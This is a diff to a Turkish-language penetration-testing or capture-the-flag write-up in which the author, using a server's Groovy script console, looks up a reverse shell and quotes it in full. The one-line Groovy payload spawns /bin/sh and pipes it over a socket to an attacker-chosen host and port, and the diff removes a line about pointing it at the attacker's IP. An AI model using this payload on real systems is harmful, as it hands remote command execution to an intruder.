@@ -58,7 +58,7 @@ Sayfa beni şu mesajla karşılıyor:
  
 > Type in an arbitrary **Groovy script** and execute it on the server.
  
-Bu, tam olarak beklediğim şey: yetkili bir kullanıcı olarak sunucu üzerinde doğrudan Groovy (dolayısıyla JVM üzerinden herhangi bir sistem komutu) çalıştırabiliyorum. Groovy tabanlı bir **reverse shell** payload'ı arıyorum ve şu kaynağa ulaşıyorum:
+Bu, tam olarak beklediğim şey: yetkili bir kullanıcı olarak sunucu üzerinde doğrudan Groovy çalıştırabiliyorum. Groovy tabanlı bir **reverse shell** payload'ı arıyorum ve şu kaynağa ulaşıyorum:
  
 > https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell
  
@@ -71,9 +71,6 @@ String cmd="/bin/sh";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
  
-`host` değişkenini kendi (attacker) IP'me, `port` değişkenini de dinleyeceğim porta göre ayarlıyorum.
- 
----
  
 ## 5. Listener Hazırlığı ve Shell Alımı
  
